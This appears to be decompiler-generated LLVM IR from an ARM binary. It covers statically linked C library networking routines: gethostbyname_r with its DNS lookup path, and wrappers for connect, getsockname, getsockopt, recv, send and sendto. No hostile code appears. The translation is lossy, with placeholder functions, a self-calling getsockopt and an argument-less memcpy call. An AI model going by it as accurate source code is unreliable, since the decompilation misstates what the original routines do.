  %v3_14634 = load i32, i32* @r4, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_14640 = call i32 @__GI___h_errno_location()
  %v2_14644 = ptrtoint i32* %stack_var_-12 to i32
  %v0_14650 = load i32, i32* @r4, align 4
  %v7_14660 = call i32 @gethostbyname_r(i32 %v0_14650, i32* nonnull @global_var_2fb14.1110, i32 ptrtoint (i32* @global_var_2f948.1112 to i32), i32 460, i32 %v2_14644, i32 %v0_14640)
  %v3_14664 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_14634, i32* @r4, align 4
  ret i32 %v3_14664
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v6_14678 = load i32, i32* @r5, align 4
  %v9_14678 = load i32, i32* @r6, align 4
  %v12_14678 = load i32, i32* @r7, align 4
  %v15_14678 = load i32, i32* @r8, align 4
  %v18_14678 = load i32, i32* @sb, align 4
  %v21_14678 = load i32, i32* @sl, align 4
  %v24_14678 = load i32, i32* @fp, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  %v0_14688 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14688, i32* @fp, align 4
  %v2_14688 = icmp eq i32 %v0_14688, 0
  store i32 0, i32* @r6, align 4
  store i32 %tmp, i32* @sl, align 4
  store i32 %arg4, i32* @r4, align 4
  %v2_14698 = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v2_14698, align 4
  br i1 %v2_14688, label %bb, label %dec_label_pc_146a4

bb:                                               ; preds = %entry
  %v1_1469c = load i32, i32* %r0.global-to-local, align 4
  %v2_1469c = add i32 %v1_1469c, 22
  store i32 %v2_1469c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_149c8

dec_label_pc_146a4:                               ; preds = %entry
  %v0_146a4 = call i32 @__errno_location()
  store i32 %v0_146a4, i32* %r0.global-to-local, align 4
  %v3_146a8 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_146a8, i32* %ip.global-to-local, align 4
  %v1_146ac = inttoptr i32 %v0_146a4 to i32*
  %v2_146ac = load i32, i32* %v1_146ac, align 4
  store i32 %v2_146ac, i32* @r8, align 4
  %v0_146b0 = load i32, i32* @r6, align 4
  store i32 %v0_146b0, i32* %v1_146ac, align 4
  %v0_146b4 = load i32, i32* %ip.global-to-local, align 4
  store i32 %arg6, i32* %ip.global-to-local, align 4
  store i32 %v0_146a4, i32* @r5, align 4
  %v0_146c4 = load i32, i32* @fp, align 4
  store i32 %v0_146c4, i32* %r0.global-to-local, align 4
  %v0_146c8 = load i32, i32* @sl, align 4
  store i32 %v0_146c8, i32* %r2.global-to-local, align 4
  %v0_146cc = load i32, i32* @r7, align 4
  store i32 %v0_146cc, i32* %r3.global-to-local, align 4
  %v0_146d0 = load i32, i32* @r4, align 4
  %v7_146d8 = call i32 @__get_hosts_byname_r(i32 %v0_146c4, i32 2, i32 %v0_146c8, i32 %v0_146cc, i32 %v0_146d0, i32 %v0_146b4, i32 %arg6)
  store i32 %v7_146d8, i32* %r0.global-to-local, align 4
  %v2_146dc = icmp eq i32 %v7_146d8, 0
  br i1 %v2_146dc, label %dec_label_pc_149c8, label %dec_label_pc_146e4

dec_label_pc_146e4:                               ; preds = %dec_label_pc_146a4
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v1_146e8 = inttoptr i32 %arg6 to i32*
  %v2_146e8 = load i32, i32* %v1_146e8, align 4
  store i32 %v2_146e8, i32* %r3.global-to-local, align 4
  %v7_146ec = icmp eq i32 %v2_146e8, 1
  br i1 %v7_146ec, label %dec_label_pc_14710, label %dec_label_pc_146f4

dec_label_pc_146f4:                               ; preds = %dec_label_pc_146e4
  %v7_146f4 = icmp eq i32 %v2_146e8, 4
  br i1 %v7_146f4, label %dec_label_pc_14710, label %dec_label_pc_146fc

dec_label_pc_146fc:                               ; preds = %dec_label_pc_146f4
  %v3_146fc = icmp eq i32 %v2_146e8, -1
  br i1 %v3_146fc, label %dec_label_pc_14704, label %dec_label_pc_149c8

dec_label_pc_14704:                               ; preds = %dec_label_pc_146fc
  %v0_14704 = load i32, i32* @r5, align 4
  %v1_14704 = inttoptr i32 %v0_14704 to i32*
  %v2_14704 = load i32, i32* %v1_14704, align 4
  store i32 %v2_14704, i32* %r3.global-to-local, align 4
  %v7_14708 = icmp eq i32 %v2_14704, 2
  br i1 %v7_14708, label %dec_label_pc_14710, label %dec_label_pc_149c8

dec_label_pc_14710:                               ; preds = %dec_label_pc_14704, %dec_label_pc_146f4, %dec_label_pc_146e4
  %v0_14710 = load i32, i32* @r7, align 4
  %v1_14710 = sub i32 0, %v0_14710
  %v1_14714 = urem i32 %v1_14710, 4
  store i32 %v1_14714, i32* %r3.global-to-local, align 4
  %v2_14714 = icmp eq i32 %v1_14714, 0
  %v0_14718 = load i32, i32* @r8, align 4
  %v1_14718 = load i32, i32* @r5, align 4
  %v2_14718 = inttoptr i32 %v1_14718 to i32*
  store i32 %v0_14718, i32* %v2_14718, align 4
  %v0_14738.pre = load i32, i32* @r4, align 4
  br i1 %v2_14714, label %dec_label_pc_14730, label %dec_label_pc_14720

dec_label_pc_14720:                               ; preds = %dec_label_pc_14710
  %v1_14720 = load i32, i32* %r3.global-to-local, align 4
  %v2_14720 = sub i32 %v0_14738.pre, %v1_14720
  %v3_14720 = icmp ult i32 %v0_14738.pre, %v1_14720
  br i1 %v3_14720, label %dec_label_pc_149c4, label %dec_label_pc_14728

dec_label_pc_14728:                               ; preds = %dec_label_pc_14720
  store i32 %v2_14720, i32* @r4, align 4
  %v0_1472c = load i32, i32* @r7, align 4
  %v2_1472c = add i32 %v0_1472c, %v1_14720
  store i32 %v2_1472c, i32* @r7, align 4
  br label %dec_label_pc_14730

dec_label_pc_14730:                               ; preds = %dec_label_pc_14710, %dec_label_pc_14728
  %v0_14738 = phi i32 [ %v2_14720, %dec_label_pc_14728 ], [ %v0_14738.pre, %dec_label_pc_14710 ]
  store i32 %arg6, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 -1, i32* %v1_146e8, align 4
  %tmp31 = icmp ult i32 %v0_14738, 4
  br i1 %tmp31, label %dec_label_pc_149c4, label %dec_label_pc_14744

dec_label_pc_14744:                               ; preds = %dec_label_pc_14730
  %v0_14744 = load i32, i32* @r4, align 4
  %v1_14744 = add i32 %v0_14744, -4
  store i32 %v1_14744, i32* %r3.global-to-local, align 4
  %tmp32 = icmp ult i32 %v1_14744, 8
  br i1 %tmp32, label %dec_label_pc_149c4, label %dec_label_pc_14750

dec_label_pc_14750:                               ; preds = %dec_label_pc_14744
  %v1_14750 = add i32 %v0_14744, -12
  store i32 %v1_14750, i32* %r3.global-to-local, align 4
  %v0_14754 = load i32, i32* @r7, align 4
  %v1_14754 = add i32 %v0_14754, 4
  store i32 %v1_14754, i32* @sb, align 4
  store i32 0, i32* @r5, align 4
  %v3_14760 = inttoptr i32 %v1_14754 to i32*
  store i32 %v0_14754, i32* %v3_14760, align 4
  %v0_14764 = load i32, i32* @r5, align 4
  %v1_14764 = load i32, i32* @sb, align 4
  %v2_14764 = add i32 %v1_14764, 4
  %v3_14764 = inttoptr i32 %v2_14764 to i32*
  store i32 %v0_14764, i32* %v3_14764, align 4
  %tmp33 = icmp ult i32 %v1_14750, 32
  br i1 %tmp33, label %dec_label_pc_149c4, label %dec_label_pc_1476c

dec_label_pc_1476c:                               ; preds = %dec_label_pc_14750
  %v0_1476c = load i32, i32* @r4, align 4
  %v1_1476c = add i32 %v0_1476c, -44
  store i32 %v1_1476c, i32* @r8, align 4
  %tmp34 = icmp ult i32 %v1_1476c, 256
  br i1 %tmp34, label %dec_label_pc_149c4, label %dec_label_pc_14778

dec_label_pc_14778:                               ; preds = %dec_label_pc_1476c
  %v0_14778 = load i32, i32* @r7, align 4
  %v1_14778 = add i32 %v0_14778, 44
  store i32 %v1_14778, i32* @r6, align 4
  %v1_1477c = add i32 %v0_14778, 12
  store i32 %v1_1477c, i32* %r3.global-to-local, align 4
  %v0_14780 = load i32, i32* @fp, align 4
  store i32 %v0_14780, i32* @r1, align 4
  store i32 %v1_1476c, i32* %r2.global-to-local, align 4
  store i32 %v1_14778, i32* %r0.global-to-local, align 4
  %v3_14790 = call i32 @strncpy(i32 %v1_14778, i32 %v0_14780, i32 %v1_1476c)
  store i32 %v1_1477c, i32* %ip.global-to-local, align 4
  %v0_14798 = load i32, i32* @r6, align 4
  %v1_14798 = load i32, i32* @r7, align 4
  %v2_14798 = add i32 %v1_14798, 12
  %v3_14798 = inttoptr i32 %v2_14798 to i32*
  store i32 %v0_14798, i32* %v3_14798, align 4
  %v0_1479c = load i32, i32* @fp, align 4
  store i32 %v0_1479c, i32* %r0.global-to-local, align 4
  %v0_147a0 = load i32, i32* @r5, align 4
  %v1_147a0 = load i32, i32* %ip.global-to-local, align 4
  %v2_147a0 = add i32 %v1_147a0, 4
  %v3_147a0 = inttoptr i32 %v2_147a0 to i32*
  store i32 %v0_147a0, i32* %v3_147a0, align 4
  %v0_147a4 = load i32, i32* @r7, align 4
  %v2_147a8 = inttoptr i32 %v0_1479c to i8*
  %v3_147a8 = call i32 @inet_aton(i8* %v2_147a8, i32 %v0_147a4)
  store i32 %v3_147a8, i32* %r0.global-to-local, align 4
  %v2_147ac = icmp eq i32 %v3_147a8, 0
  br i1 %v2_147ac, label %dec_label_pc_147f0, label %dec_label_pc_147b8

dec_label_pc_147b8:                               ; preds = %dec_label_pc_14778
  store i32 2, i32* %r3.global-to-local, align 4
  %v1_147bc = load i32, i32* @sl, align 4
  %v2_147bc = add i32 %v1_147bc, 8
  %v3_147bc = inttoptr i32 %v2_147bc to i32*
  store i32 2, i32* %v3_147bc, align 4
  %v0_147c0 = load i32, i32* %r3.global-to-local, align 4
  %v2_147c0 = mul i32 %v0_147c0, 2
  %v1_147c4 = load i32, i32* @sl, align 4
  %v2_147c4 = add i32 %v1_147c4, 12
  %v3_147c4 = inttoptr i32 %v2_147c4 to i32*
  store i32 %v2_147c0, i32* %v3_147c4, align 4
  %v3_147c8 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_147c8, i32* %r2.global-to-local, align 4
  store i32 %v1_1477c, i32* %r3.global-to-local, align 4
  store i32 %arg6, i32* %ip.global-to-local, align 4
  %v0_147d4 = load i32, i32* @r5, align 4
  store i32 %v0_147d4, i32* %r0.global-to-local, align 4
  %v0_147d8 = load i32, i32* @sl, align 4
  %v2_147d8 = inttoptr i32 %v3_147c8 to i32*
  store i32 %v0_147d8, i32* %v2_147d8, align 4
  %v0_147dc = load i32, i32* @r6, align 4
  %v1_147dc = load i32, i32* @sl, align 4
  %v2_147dc = inttoptr i32 %v1_147dc to i32*
  store i32 %v0_147dc, i32* %v2_147dc, align 4
  %v0_147e0 = load i32, i32* @sb, align 4
  %v1_147e0 = load i32, i32* @sl, align 4
  %v2_147e0 = add i32 %v1_147e0, 16
  %v3_147e0 = inttoptr i32 %v2_147e0 to i32*
  store i32 %v0_147e0, i32* %v3_147e0, align 4
  %v0_147e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_147e4 = load i32, i32* @sl, align 4
  %v2_147e4 = add i32 %v1_147e4, 4
  %v3_147e4 = inttoptr i32 %v2_147e4 to i32*
  store i32 %v0_147e4, i32* %v3_147e4, align 4
  %v0_147e8 = load i32, i32* @r5, align 4
  %v1_147e8 = load i32, i32* %ip.global-to-local, align 4
  %v2_147e8 = inttoptr i32 %v1_147e8 to i32*
  store i32 %v0_147e8, i32* %v2_147e8, align 4
  br label %dec_label_pc_149c8

dec_label_pc_147f0:                               ; preds = %dec_label_pc_14778
  %v2_147f0 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_147f0, i32* @r5, align 4
  %v1_147f4 = call i32 @__open_nameservers(i32 0)
  store i32 ptrtoint (i32* @global_var_298d8.1114 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_147f0, i32* @r0, align 4
  store i32 89400, i32* %r3.global-to-local, align 4
  %v1_1480c = call i32 @__pthread_return_void()
  store i32 ptrtoint (i8* @global_var_15d30.1039 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_298d8.1114 to i32), i32* %r0.global-to-local, align 4
  %v1_1481c = call i32 @__pthread_return_0()
  store i32 %v2_147f0, i32* @r0, align 4
  %v2_14828 = load i32, i32* @global_var_2fc4c.1119, align 4
  store i32 %v2_14828, i32* @r4, align 4
  store i32 89400, i32* %r3.global-to-local, align 4
  %v1_14838 = call i32 @__pthread_return_void()
  %v2_14844 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_2fc40.1122 to i32), i32* %r3.global-to-local, align 4
  %v0_14850 = load i32, i32* @fp, align 4
  store i32 %v0_14850, i32* %r0.global-to-local, align 4
  %v2_14854 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_14854, i32* %ip.global-to-local, align 4
  %v0_14858 = load i32, i32* @r4, align 4
  store i32 %v0_14858, i32* %r2.global-to-local, align 4
  %v6_1486c = inttoptr i32 %v0_14850 to i8*
  %v7_1486c = call i32 @__dns_lookup(i8* %v6_1486c, i32 1, i32 %v0_14858, i32 ptrtoint (i32* @global_var_2fc40.1122 to i32), i32 %v2_14844, i32 %v2_14854)
  store i32 %v7_1486c, i32* %r0.global-to-local, align 4
  %v1_14870 = icmp slt i32 %v7_1486c, 0
  br i1 %v1_14870, label %.dec_label_pc_1499c_crit_edge, label %dec_label_pc_14880

.dec_label_pc_1499c_crit_edge:                    ; preds = %dec_label_pc_147f0
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1499c

dec_label_pc_14880:                               ; preds = %dec_label_pc_147f0
  store i32 256, i32* %r3.global-to-local, align 4
  %v1_14894 = load i32, i32* @r8, align 4
  %tmp35 = icmp ugt i32 %v1_14894, 255
  br i1 %tmp35, label %dec_label_pc_14930, label %dec_label_pc_1489c

dec_label_pc_1489c:                               ; preds = %dec_label_pc_14880
  %v3_1489c = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_1489c, i32* %r0.global-to-local, align 4
  %v1_148a0 = call i32 @free(i32 %v3_1489c)
  %v3_148a4 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_148a4, i32* %r0.global-to-local, align 4
  %v1_148a8 = call i32 @free(i32 %v3_148a4)
  store i32 %arg6, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 34, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %v1_146e8, align 4
  br label %dec_label_pc_149c8

dec_label_pc_14930:                               ; preds = %dec_label_pc_14880
  %v3_14934.pre = load i32, i32* %stack_var_-96, align 4
  %v0_14938.pre = load i32, i32* @r6, align 4
  store i32 %v1_14894, i32* %r2.global-to-local, align 4
  store i32 %v3_14934.pre, i32* @r1, align 4
  store i32 %v0_14938.pre, i32* %r0.global-to-local, align 4
  %v3_1493c = call i32 @strncpy(i32 %v0_14938.pre, i32 %v3_14934.pre, i32 %v1_14894)
  %v3_14940 = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_14940, i32* %r0.global-to-local, align 4
  %v1_14944 = call i32 @free(i32 %v3_14940)
  store i32 %v1_14944, i32* %r0.global-to-local, align 4
  store i32 %tmp7, i32* %r3.global-to-local, align 4
  %v7_1494c = icmp eq i32 %tmp7, 1
  br i1 %v7_1494c, label %dec_label_pc_14954, label %dec_label_pc_149a8

dec_label_pc_14954:                               ; preds = %dec_label_pc_14930
  store i32 4, i32* @r2, align 4
  %v0_1495c = load i32, i32* @r7, align 4
  store i32 %v0_1495c, i32* @r0, align 4
  %v0_14960 = call i32 @memcpy()
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %v1_1477c, i32* %r2.global-to-local, align 4
  %v1_1496c = load i32, i32* @sl, align 4
  %v2_1496c = add i32 %v1_1496c, 8
  %v3_1496c = inttoptr i32 %v2_1496c to i32*
  store i32 2, i32* %v3_1496c, align 4
  %v0_14970 = load i32, i32* %r3.global-to-local, align 4
  %v2_14970 = mul i32 %v0_14970, 2
  store i32 %v2_14970, i32* %r3.global-to-local, align 4
  %v1_14974 = load i32, i32* @sl, align 4
  %v2_14974 = add i32 %v1_14974, 12
  %v3_14974 = inttoptr i32 %v2_14974 to i32*
  store i32 %v2_14970, i32* %v3_14974, align 4
  %v3_14978 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_14978, i32* %r0.global-to-local, align 4
  %v0_1497c = load i32, i32* @r6, align 4
  %v1_1497c = load i32, i32* @sl, align 4
  %v2_1497c = inttoptr i32 %v1_1497c to i32*
  store i32 %v0_1497c, i32* %v2_1497c, align 4
  %v0_14980 = load i32, i32* @sb, align 4
  %v1_14980 = load i32, i32* @sl, align 4
  %v2_14980 = add i32 %v1_14980, 16
  %v3_14980 = inttoptr i32 %v2_14980 to i32*
  store i32 %v0_14980, i32* %v3_14980, align 4
  %v0_14984 = load i32, i32* %r2.global-to-local, align 4
  %v1_14984 = load i32, i32* @sl, align 4
  %v2_14984 = add i32 %v1_14984, 4
  %v3_14984 = inttoptr i32 %v2_14984 to i32*
  store i32 %v0_14984, i32* %v3_14984, align 4
  %v1_14988 = call i32 @free(i32 %v3_14978)
  %v3_1498c = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1498c, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_14994 = load i32, i32* @sl, align 4
  %v2_14994 = inttoptr i32 %v3_1498c to i32*
  store i32 %v0_14994, i32* %v2_14994, align 4
  %v0_14998 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_14998, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1499c

dec_label_pc_1499c:                               ; preds = %.dec_label_pc_1499c_crit_edge, %dec_label_pc_14954
  %v0_149a0 = phi i32 [ 1, %.dec_label_pc_1499c_crit_edge ], [ %v0_14998, %dec_label_pc_14954 ]
  store i32 %arg6, i32* %r2.global-to-local, align 4
  store i32 %v0_149a0, i32* %v1_146e8, align 4
  br label %dec_label_pc_149c8

dec_label_pc_149a8:                               ; preds = %dec_label_pc_14930
  %v3_149a8 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_149a8, i32* %r0.global-to-local, align 4
  %v1_149ac = call i32 @free(i32 %v3_149a8)
  store i32 %arg6, i32* %ip.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %v1_146e8, align 4
  br label %dec_label_pc_149c8

dec_label_pc_149c4:                               ; preds = %dec_label_pc_14720, %dec_label_pc_1476c, %dec_label_pc_14750, %dec_label_pc_14744, %dec_label_pc_14730
  store i32 34, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_149c8

dec_label_pc_149c8:                               ; preds = %bb, %dec_label_pc_14704, %dec_label_pc_146fc, %dec_label_pc_146a4, %dec_label_pc_149a8, %dec_label_pc_1499c, %dec_label_pc_1489c, %dec_label_pc_147b8, %dec_label_pc_149c4
  store i32 %v6_14678, i32* @r5, align 4
  store i32 %v9_14678, i32* @r6, align 4
  store i32 %v12_14678, i32* @r7, align 4
  store i32 %v15_14678, i32* @r8, align 4
  store i32 %v18_14678, i32* @sb, align 4
  store i32 %v21_14678, i32* @sl, align 4
  store i32 %v24_14678, i32* @fp, align 4
  %v29_149cc = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v29_149cc

; uselistorder directives
  uselistorder i32 %v2_14970, { 1, 0 }
  uselistorder i32 %v1_14894, { 1, 2, 0 }
  uselistorder i32 %v1_1477c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_14778, { 1, 0, 2 }
  uselistorder i32 %v1_1476c, { 2, 1, 0, 3 }
  uselistorder i32 %v0_14738.pre, { 0, 2, 1 }
  uselistorder i32 %v1_14714, { 1, 0 }
  uselistorder i32* %v1_146e8, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v0_14688, { 1, 0 }
  uselistorder i32* %stack_var_-96, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 0 }
  uselistorder i32 %tmp7, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r0.global-to-local, { 24, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14, 17, 15, 16, 18, 20, 19, 21, 23, 22, 26, 25, 0, 1, 2 }
  uselistorder i32 (i8*, i32)* @inet_aton, { 1, 0 }
  uselistorder i32 %arg6, { 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_149c8, { 8, 4, 5, 6, 7, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_149c4, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1499c, { 1, 0 }
  uselistorder label %dec_label_pc_14730, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, %sockaddr* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_149ec = load i32, i32* @r4, align 4
  store i32 %v3_149ec, i32* %stack_var_-8, align 4
  %v5_149f0 = call i32 @connect(i32 %arg1, %sockaddr* %arg2, i32 %arg3)
  store i32 %v5_149f0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_149f0, -4095
  br i1 %tmp, label %dec_label_pc_14a10, label %dec_label_pc_14a00

dec_label_pc_14a00:                               ; preds = %entry
  %v0_14a00 = call i32 @__errno_location()
  %v0_14a04 = load i32, i32* %r4.global-to-local, align 4
  %v1_14a04 = sub i32 0, %v0_14a04
  %v2_14a08 = inttoptr i32 %v0_14a00 to i32*
  store i32 %v1_14a04, i32* %v2_14a08, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14a10

dec_label_pc_14a10:                               ; preds = %entry, %dec_label_pc_14a00
  %v0_14a10 = phi i32 [ %v5_149f0, %entry ], [ -1, %dec_label_pc_14a00 ]
  %v2_14a14 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14a14, i32* @r4, align 4
  ret i32 %v0_14a10

; uselistorder directives
  uselistorder i32 %v5_149f0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14a10, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, %sockaddr* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14a18 = load i32, i32* @r4, align 4
  store i32 %v3_14a18, i32* %stack_var_-8, align 4
  %v5_14a1c = inttoptr i32 %arg3 to i32*
  %v6_14a1c = call i32 @getsockname(i32 %arg1, %sockaddr* %arg2, i32* %v5_14a1c)
  store i32 %v6_14a1c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v6_14a1c, -4095
  br i1 %tmp, label %dec_label_pc_14a3c, label %dec_label_pc_14a2c

dec_label_pc_14a2c:                               ; preds = %entry
  %v0_14a2c = call i32 @__errno_location()
  %v0_14a30 = load i32, i32* %r4.global-to-local, align 4
  %v1_14a30 = sub i32 0, %v0_14a30
  %v2_14a34 = inttoptr i32 %v0_14a2c to i32*
  store i32 %v1_14a30, i32* %v2_14a34, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14a3c

dec_label_pc_14a3c:                               ; preds = %entry, %dec_label_pc_14a2c
  %v0_14a3c = phi i32 [ %v6_14a1c, %entry ], [ -1, %dec_label_pc_14a2c ]
  %v2_14a40 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14a40, i32* @r4, align 4
  ret i32 %v0_14a3c

; uselistorder directives
  uselistorder i32 %v6_14a1c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14a3c, { 1, 0 }
}

define i32 @getsockopt() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14a44 = load i32, i32* @r4, align 4
  store i32 %v3_14a44, i32* %stack_var_-8, align 4
  %v0_14a4c = call i32 @getsockopt()
  store i32 %v0_14a4c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14a4c, -4095
  br i1 %tmp, label %dec_label_pc_14a6c, label %dec_label_pc_14a5c

dec_label_pc_14a5c:                               ; preds = %entry
  %v0_14a5c = call i32 @__errno_location()
  %v0_14a60 = load i32, i32* %r4.global-to-local, align 4
  %v1_14a60 = sub i32 0, %v0_14a60
  %v2_14a64 = inttoptr i32 %v0_14a5c to i32*
  store i32 %v1_14a60, i32* %v2_14a64, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14a6c

dec_label_pc_14a6c:                               ; preds = %entry, %dec_label_pc_14a5c
  %v0_14a6c = phi i32 [ %v0_14a4c, %entry ], [ -1, %dec_label_pc_14a5c ]
  %v2_14a70 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14a70, i32* @r4, align 4
  ret i32 %v0_14a6c

; uselistorder directives
  uselistorder i32 %v0_14a4c, { 1, 0, 2 }
  uselistorder i32 ()* @getsockopt, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14a6c, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14a74 = load i32, i32* @r4, align 4
  store i32 %v3_14a74, i32* %stack_var_-8, align 4
  %v5_14a78 = call i32 @recv(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  store i32 %v5_14a78, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_14a78, -4095
  br i1 %tmp, label %dec_label_pc_14a98, label %dec_label_pc_14a88

dec_label_pc_14a88:                               ; preds = %entry
  %v0_14a88 = call i32 @__errno_location()
  %v0_14a8c = load i32, i32* %r4.global-to-local, align 4
  %v1_14a8c = sub i32 0, %v0_14a8c
  %v2_14a90 = inttoptr i32 %v0_14a88 to i32*
  store i32 %v1_14a8c, i32* %v2_14a90, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14a98

dec_label_pc_14a98:                               ; preds = %entry, %dec_label_pc_14a88
  %v0_14a98 = phi i32 [ %v5_14a78, %entry ], [ -1, %dec_label_pc_14a88 ]
  %v2_14a9c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14a9c, i32* @r4, align 4
  ret i32 %v0_14a98

; uselistorder directives
  uselistorder i32 %v5_14a78, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14a98, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14aa0 = load i32, i32* @r4, align 4
  store i32 %v3_14aa0, i32* %stack_var_-8, align 4
  %v5_14aa4 = call i32 @send(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  store i32 %v5_14aa4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_14aa4, -4095
  br i1 %tmp, label %dec_label_pc_14ac4, label %dec_label_pc_14ab4

dec_label_pc_14ab4:                               ; preds = %entry
  %v0_14ab4 = call i32 @__errno_location()
  %v0_14ab8 = load i32, i32* %r4.global-to-local, align 4
  %v1_14ab8 = sub i32 0, %v0_14ab8
  %v2_14abc = inttoptr i32 %v0_14ab4 to i32*
  store i32 %v1_14ab8, i32* %v2_14abc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14ac4

dec_label_pc_14ac4:                               ; preds = %entry, %dec_label_pc_14ab4
  %v0_14ac4 = phi i32 [ %v5_14aa4, %entry ], [ -1, %dec_label_pc_14ab4 ]
  %v2_14ac8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14ac8, i32* @r4, align 4
  ret i32 %v0_14ac4

; uselistorder directives
  uselistorder i32 %v5_14aa4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14ac4, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_14acc = load i32, i32* @r4, align 4
  store i32 %v3_14acc, i32* %stack_var_-12, align 4
  %v5_14ad8 = call i32 @sendto(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, %sockaddr* null, i32 0)
  store i32 %v5_14ad8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_14ad8, -4095
